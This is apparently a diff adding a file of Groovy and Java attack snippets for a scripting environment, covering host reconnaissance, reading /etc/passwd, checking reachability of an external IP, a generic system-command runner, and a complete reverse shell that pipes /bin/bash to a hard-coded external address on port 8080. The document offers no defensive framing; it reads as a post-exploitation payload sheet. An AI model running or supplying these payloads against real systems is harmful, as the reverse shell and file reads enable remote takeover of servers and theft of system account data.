@@ -1,0 +1,82 @@
+—————Get Mac Address—————
+NetworkInterface.networkInterfaces*.hardwareAddress*.collect { String.format( '%02x', it ) }*.join( ':' )
+—————————————————————————-
+
+—————Get IP Address—————
+"'${InetAddress.getLocalHost()}'}"
+
+
+
+
+
+
+
+—————Get IP of Google—————
+def hostname = 'google.com'
+println InetAddress.getByName(hostname).address.collect { it & 0xFF }.join('.')
+—————————————————————————-
+
+
+—————Read Password File—————
+new File('/etc/passwd').eachLine { line -> 
+  println line 
+}
+—————————————————————————-
+
+
+—————Reverse Shell—————
+String host="54.209.131.202"; 
+int port=8080; 
+String cmd="/bin/bash"; 
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close(); 
+—————————————————————————-
+
+
+—————Reach external host—————
+public class PingExample { 
+    public static void main(String[] args){ 
+        try{ 
+            InetAddress address = InetAddress.getByName("54.209.131.202"); 
+            boolean reachable = address.isReachable(10000); 
+            System.out.println("Is host reachable? " + reachable); 
+        } catch (Exception e){ 
+            e.printStackTrace(); 
+        } 
+    } 
+}
+—————————————————————————-
+
+
+
+
+
+
+
+———————Run any system command————————
+def runCommand (String cmdLine = "" , long wait = 5000 ) 
+{
+ 
+ def sout = new StringBuffer() 
+ def serr = new StringBuffer() 
+ def piped = cmdLine.split("\\|") as List
+ def p
+ piped.each { cmd ->
+    cmd = cmd.trim()
+    def cmdList = cmd.split(' ') as List
+    if(p)
+       p = p.pipeTo(cmdList.execute())
+     else
+       p = cmdList.execute()
+ }
+ p.consumeProcessOutput(sout,serr)  
+ p.waitForOrKill(wait)
+ if(serr)
+     println serr     
+ if(sout)
+     println sout        
+}
+ 
+//examples 
+runCommand("cat /etc/passwd");
+runCommand("ls -lsa");
+—————————————————————————-
